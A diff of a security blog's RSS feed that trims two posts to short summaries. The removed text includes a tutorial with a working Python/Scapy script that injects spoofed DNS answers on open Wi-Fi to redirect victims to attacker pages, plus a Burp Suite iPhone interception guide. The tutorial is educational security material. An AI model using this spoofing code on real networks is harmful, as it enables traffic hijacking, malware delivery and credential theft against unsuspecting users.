@@ -7,7 +7,9 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <lastBuildDate>Fri, 15 Nov 2013 00:00:00 +0000</lastBuildDate>
-    <atom:link href="https://jordan-wright.com/blog/tags/security/index.xml" rel="self" type="application/rss+xml" />
+    
+	<atom:link href="https://jordan-wright.com/blog/tags/security/index.xml" rel="self" type="application/rss+xml" />
+    
     
     <item>
       <title>Wireless Attacks with Python: Part One - The &#34;Dnspwn Attack&#34;</title>
@@ -15,133 +17,15 @@
       <pubDate>Fri, 15 Nov 2013 00:00:00 +0000</pubDate>
       
       <guid>https://jordan-wright.com/blog/2013/11/15/wireless-attacks-with-python-part-one-the-airpwn-attack/</guid>
-      <description>
-
-&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/wireless_python.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
+      <description>&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/wireless_python.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
 
 
 &lt;h3 id=&#34;introduction&#34;&gt;Introduction&lt;/h3&gt;
 
 &lt;p&gt;A while back, I &lt;a href=&#34;http://raidersec.blogspot.com/2013/01/wireless-deauth-attack-using-aireplay.html&#34;&gt;published a post&lt;/a&gt; on the Raidersec blog demonstrating how to perform a deauthentication attack using Python and Scapy. I enjoyed writing the post, since I got the opportunity to learn in-depth about how different wireless attacks work, beyond just learning how to exclusively use the &lt;a href=&#34;http://www.aircrack-ng.org/&#34;&gt;aircrack suite&lt;/a&gt;.&lt;/p&gt;
 
-&lt;p&gt;So, with that being said, this post will kick off a short series of posts discussing how to perform common wireless attacks using Python. I hope you enjoy the posts and, as always, never hesitate to let me know if you have any comments or questions below.&lt;/p&gt;
-
-&lt;h3 id=&#34;the-dnspwn-attack&#34;&gt;The &amp;ldquo;Dnspwn Attack&amp;rdquo;&lt;/h3&gt;
-
-&lt;p&gt;The first attack we&amp;rsquo;ll explore is what I call the &amp;ldquo;dnspwn attack&amp;rdquo; (since, from what I can tell, this attack was first created targeting HTTP with the &amp;ldquo;&lt;a href=&#34;http://airpwn.sourceforge.net/Airpwn.html&#34;&gt;airpwn&lt;/a&gt;&amp;rdquo; tool, and later extended to DNS) The idea behind the attack is pretty simple:&lt;/p&gt;
-
-&lt;p&gt;Consider two people on the same open WLAN: Bob and Eve. Eve wants to get Bob to visit a malicious webpage she created so that she can install malware onto Bob&amp;rsquo;s computer via a drive-by download, or perhaps show a spoofed website to try and steal Bob&amp;rsquo;s credentials.&lt;/p&gt;
-
-&lt;p&gt;To do this, she remembers that she can sniff all requests coming to and from Bob&amp;rsquo;s computer. She also knows that she is &lt;em&gt;closer&lt;/em&gt; to Bob than the web server he is sending a request to. So, she decides to wait until Bob sends a web request, and see if she can send back a spoofed response pretending to come from the web server &lt;em&gt;before&lt;/em&gt; the actual web server can respond. Turns out, she can. In fact, once the spoofed response is received, Bob&amp;rsquo;s computer will likely ignore any further traffic received, including the real response!&lt;/p&gt;
-
-&lt;p&gt;Let&amp;rsquo;s see what this would look like:&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://jordan-wright.com/blog/blog/images/blog/wireless-attacks/dnspwn/diagram.png&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/blog/wireless-attacks/dnspwn/diagram_small.png&#34;/&gt;&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;So, now that we know how the attack works, let&amp;rsquo;s automate it!&lt;/p&gt;
-
-&lt;h3 id=&#34;setting-up-the-alfa-awus06h&#34;&gt;Setting up the Alfa AWUS06H&lt;/h3&gt;
-
-&lt;p&gt;As was the case in my Raidersec post, we will be using the handy &lt;a href=&#34;http://www.amazon.com/Alfa-AWUS036H-802-11b-Wireless-network/dp/B002WCEWU8&#34;&gt;Alfa AWUS036H&lt;/a&gt; for this attack. The first thing we want to do is to put our wireless card in monitor mode so that we can capture all traffic coming from the &lt;code&gt;demo_insecure&lt;/code&gt; network.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;root@bt:~# airmon-ng start wlan0
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Now that we have monitor mode up and running on &lt;code&gt;mon0&lt;/code&gt;, let&amp;rsquo;s start coding!&lt;/p&gt;
-
-&lt;h3 id=&#34;coding-the-attack&#34;&gt;Coding the Attack&lt;/h3&gt;
-
-&lt;p&gt;We will utilize the &lt;code&gt;scapy&lt;/code&gt; module to perform the attack. Let&amp;rsquo;s start by sniffing any UDP packet with a destination of port 53, and send the packet to a function called &lt;code&gt;send_response&lt;/code&gt; that we will make later:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;from scapy.all import *
-
-sniff(prn=lambda x: send_response(x),
-	lfilter=lambda x:x.haslayer(UDP) and x.dport == 53)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Now let&amp;rsquo;s create a function which can parse the request for relevant information, and inject the response. We can parse the packet and create our response simply by working our way up the layers as follows:&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;802.11 Frame - Change the &amp;ldquo;to-ds&amp;rdquo; flag to &amp;ldquo;from-ds&amp;rdquo; (our request will now be coming &lt;em&gt;from&lt;/em&gt; the access point)&lt;/li&gt;
-&lt;li&gt;802.11 Frame - Switch the source and destination MAC addresses&lt;/li&gt;
-&lt;li&gt;IP Layer - Switch the source and destination IP addresses&lt;/li&gt;
-&lt;li&gt;UDP layer - Switch the source and destination ports&lt;/li&gt;
-&lt;li&gt;DNS layer - Set the &amp;ldquo;answer&amp;rdquo; flag(s), and append our spoofed answer&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Fortunately, &lt;code&gt;scapy&lt;/code&gt; makes this very simple for us by abstracting away a lot of minor details (e.g. in fact, there are &lt;em&gt;4&lt;/em&gt; MAC address fields in an 802.11 frame, each in a different order depending on the direction of the packet). With that being said, here&amp;rsquo;s the code:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;def send_response(x):
-	# Get the requested domain
-	req_domain = x[DNS].qd.qname
-	spoofed_ip = &#39;192.168.2.1&#39;
-	# Let&#39;s build our response from a copy of the original packet
-	response = x.copy()
-	# We need to start by changing our response to be &amp;quot;from-ds&amp;quot;, or from the access point.
-	response.FCfield = 2L
-	# Switch the MAC addresses
-	response.addr1, response.addr2 = x.addr2, x.addr1
-	# Switch the IP addresses
-	response.src, response.dst = x.dst, x.src
-	# Switch the ports
-	response.sport, response.dport = x.dport, x.sport
-	# Set the DNS flags
-	response[DNS].qr = 1L
-	response[DNS].ra = 1L
-	response[DNS].ancount = 1
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Now that we&amp;rsquo;ve set all the flags, let&amp;rsquo;s create and append the DNS answer:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;response[DNS].an = DNSRR(
-	rrname = req_domain,
-	type = &#39;A&#39;,
-	rclass = &#39;IN&#39;,
-	ttl = 900,
-	rdata = spoofed_ip
-	)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;And, finally, we inject the spoofed response:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;sendp(response)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;That&amp;rsquo;s all there is to it! You can find the full source on &lt;a href=&#34;https://github.com/jordan-wright/python-wireless-attacks/blob/master/dnspwn.py&#34;&gt;Github&lt;/a&gt;.&lt;/p&gt;
-
-&lt;h3 id=&#34;demo&#34;&gt;Demo&lt;/h3&gt;
-
-&lt;p&gt;For the demo, I have the following HTML response available on the host 192.168.2.138:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;html&amp;gt;
-&amp;lt;head&amp;gt;&amp;lt;/head&amp;gt;
-&amp;lt;body&amp;gt;
-	Owned.
-&amp;lt;/body&amp;gt;
-&amp;lt;/html&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;It&amp;rsquo;s worth noticing that we can have &lt;em&gt;any&lt;/em&gt; HTML, Javascript, etc. we want. It would be trivial to hook the browser using the &lt;a href=&#34;http://beefproject.com/&#34;&gt;BeEF framework&lt;/a&gt;, for example.&lt;/p&gt;
-
-&lt;p&gt;Here&amp;rsquo;s a screenshot of it in action (I am using my iPhone as the victim):&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://jordan-wright.com/blog/blog/images/blog/wireless-attacks/dnspwn/screen_shot_pc.png&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/blog/wireless-attacks/dnspwn/screen_shot_pc.png&#34;/&gt;&lt;/a&gt;
-&lt;a href=&#34;https://jordan-wright.com/blog/blog/images/blog/wireless-attacks/dnspwn/iphone.png&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/blog/wireless-attacks/dnspwn/iphone_small.png&#34;/&gt;&lt;/a&gt;&lt;/p&gt;
-
-&lt;h3 id=&#34;conclusion-future-improvements&#34;&gt;Conclusion &amp;amp; Future Improvements&lt;/h3&gt;
-
-&lt;p&gt;It&amp;rsquo;s important to note that this attack will work just as well on other simple request/response protocols. For example, the original &amp;ldquo;airpwn&amp;rdquo; attack spoofed HTTP responses. There are also quite a few improvements we can make to this script. Here are a few:&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;Match requests against regular expressions (for example, only replacing Javascript content)&lt;/li&gt;
-&lt;li&gt;Set options from arguments / Read configuration information from a file&lt;/li&gt;
-&lt;li&gt;Implement the attack for other protocols (ie HTTP).&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Enjoy!&lt;/p&gt;
-
-&lt;p&gt;Jordan (&lt;a href=&#34;http://twitter.com/jw_sec&#34;&gt;@jw_sec&lt;/a&gt;)&lt;/p&gt;
-</description>
+&lt;p&gt;So, with that being said, this post will kick off a short series of posts discussing how to perform common wireless attacks using Python. I hope you enjoy the posts and, as always, never hesitate to let me know if you have any comments or questions below.
+&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -150,66 +34,15 @@ sniff(prn=lambda x: send_response(x),
       <pubDate>Tue, 05 Nov 2013 21:50:00 +0000</pubDate>
       
       <guid>https://jordan-wright.com/blog/2013/11/07/how-to-pentest-iphone-apps-with-burp/</guid>
-      <description>
-
-&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/iphone_burp.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
+      <description>&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/iphone_burp.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
 
 
 &lt;h3 id=&#34;introduction&#34;&gt;Introduction&lt;/h3&gt;
 
 &lt;p&gt;When looking at the functionality of mobile apps, it&amp;rsquo;s clear that they aren&amp;rsquo;t &lt;em&gt;that&lt;/em&gt; different than web applications. They often just serve as a frontend for the data stored on a central backend server or database. As such, if developers aren&amp;rsquo;t careful to protect these apps, many of the &lt;a href=&#34;https://www.owasp.org/index.php/Top_10_2013&#34;&gt;same vulnerabilities&lt;/a&gt; we find in standard web applications (such as injection attacks on unvalidated input) can be exploited by attackers.&lt;/p&gt;
 
-&lt;p&gt;This post will show how to setup the iPhone to work with the popular &lt;a href=&#34;http://portswigger.net/burp/download.html&#34;&gt;Burp Suite&lt;/a&gt; so that traffic from apps can be intercepted and tested for vulnerabilities.&lt;/p&gt;
-
-&lt;h3 id=&#34;getting-the-ca-certificate-from-burp&#34;&gt;Getting the CA Certificate from Burp&lt;/h3&gt;
-
-&lt;p&gt;First, open up Burp, select the &amp;ldquo;Proxy&amp;rdquo; tab, and select the &amp;ldquo;Options&amp;rdquo; sub-tab. Then, under &amp;ldquo;Proxy-Listeners&amp;rdquo;, highlight the interface and select &amp;ldquo;Edit&amp;rdquo;. Then, open the &amp;ldquo;Certificate&amp;rdquo; sub-tab, and make sure it is set to &amp;ldquo;Generate CA-signed per-host certificate&amp;rdquo;. Since we will install the CA certificate on our iPhone, any certificate signed by Burp will be trusted.&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://jordan-wright.com/blog/blog/images/blog/iphone_burp/burp_screen.PNG&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/blog/iphone_burp/burp_screen.PNG&#34;/&gt;&lt;/a&gt;
-&lt;a href=&#34;https://jordan-wright.com/blog/blog/images/blog/iphone_burp/burp_settings.PNG&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/blog/iphone_burp/burp_settings.PNG&#34;/&gt;&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Next, open up a desktop browser and set the proxy settings to use Burp. In this example, I&amp;rsquo;ll use Chrome. Change your settings so that the browser uses Burp as shown below (IP address and port may differ).&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://jordan-wright.com/blog/blog/images/blog/iphone_burp/pc_proxy_settings.PNG&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/blog/iphone_burp/pc_proxy_settings.PNG&#34;/&gt;&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Then, go to a site using HTTPS (ie: &lt;a href=&#34;https://www.google.com&#34;&gt;google.com&lt;/a&gt;. Once the page comes up, click the icon in the left side of the address bar, select the &amp;ldquo;Certificate&amp;rdquo; sub-tab, and make sure that the certificate is signed by &amp;ldquo;PortSwigger CA&amp;rdquo;.&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://jordan-wright.com/blog/blog/images/blog/iphone_burp/export_cert.png&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/blog/iphone_burp/export_cert.png&#34;/&gt;&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Next, click &amp;ldquo;Certificate Information&amp;rdquo;, and select &amp;ldquo;Certification Path&amp;rdquo; in the window that appears.&lt;/p&gt;
-
-&lt;p&gt;Highlight the root &lt;strong&gt;PortSwigger CA certificate&lt;/strong&gt; and click &amp;ldquo;View Certificate&amp;rdquo;. Then, open up the &amp;ldquo;Details&amp;rdquo; tab and click &amp;ldquo;Copy to File&amp;rdquo;. Follow the Certificate Export wizard, making sure to save the certificate in DER encoded binary X.509 (.CER) format.&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://jordan-wright.com/blog/blog/images/blog/iphone_burp/copy_to_file.PNG&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/blog/iphone_burp/copy_to_file.PNG&#34;/&gt;&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Once the certificate has been exported, we need to get it onto the iPhone. You can email it to yourself and open it in the iPhone, but I just chose to start a simple Python web server so that I could browse to the certificate as follows:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;python -m SimpleHTTPServer
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://jordan-wright.com/blog/blog/images/blog/iphone_burp/safari.PNG&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/blog/iphone_burp/safari.PNG&#34;/&gt;&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;After opening the certificate link in Safari, the following screen will be presented asking you if you want to install the certificate. Click &amp;ldquo;Install&amp;rdquo;, enter your PIN, and you&amp;rsquo;re all set!&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://jordan-wright.com/blog/blog/images/blog/iphone_burp/install_cert.png&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/blog/iphone_burp/install_cert.png&#34;/&gt;&lt;/a&gt;
-&lt;a href=&#34;https://jordan-wright.com/blog/blog/images/blog/iphone_burp/trusted_cert.PNG&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/blog/iphone_burp/trusted_cert.PNG&#34;/&gt;&lt;/a&gt;&lt;/p&gt;
-
-&lt;h3 id=&#34;setting-the-iphone-proxy-settings&#34;&gt;Setting the iPhone Proxy Settings&lt;/h3&gt;
-
-&lt;p&gt;The last thing you will want to do is to set your iPhone to use the Burp proxy. You can do this by going into your wireless network settings and selecting &amp;ldquo;Manual&amp;rdquo; under &amp;ldquo;HTTP PROXY&amp;rdquo;. Then, just fill in the details!&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://jordan-wright.com/blog/blog/images/blog/iphone_burp/ios_proxy_settings.png&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/blog/iphone_burp/ios_proxy_settings.png&#34;/&gt;&lt;/a&gt;&lt;/p&gt;
-
-&lt;h3 id=&#34;testing&#34;&gt;Testing&lt;/h3&gt;
-
-&lt;p&gt;You can test to see if this works by navigating to Google in Safari. If you don&amp;rsquo;t receive an error, and you can intercept the request in Burp, then you&amp;rsquo;re all set!&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://jordan-wright.com/blog/blog/images/blog/iphone_burp/success.PNG&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/blog/iphone_burp/success.PNG&#34;/&gt;&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;As always, let me know if you have any questions or comments below!&lt;/p&gt;
-
-&lt;p&gt;Jordan (&lt;a href=&#34;http://twitter.com/jw_sec&#34;&gt;@jw_sec&lt;/a&gt;)&lt;/p&gt;
-</description>
+&lt;p&gt;This post will show how to setup the iPhone to work with the popular &lt;a href=&#34;http://portswigger.net/burp/download.html&#34;&gt;Burp Suite&lt;/a&gt; so that traffic from apps can be intercepted and tested for vulnerabilities.
+&lt;/p&gt;</description>
     </item>
     
   </channel>
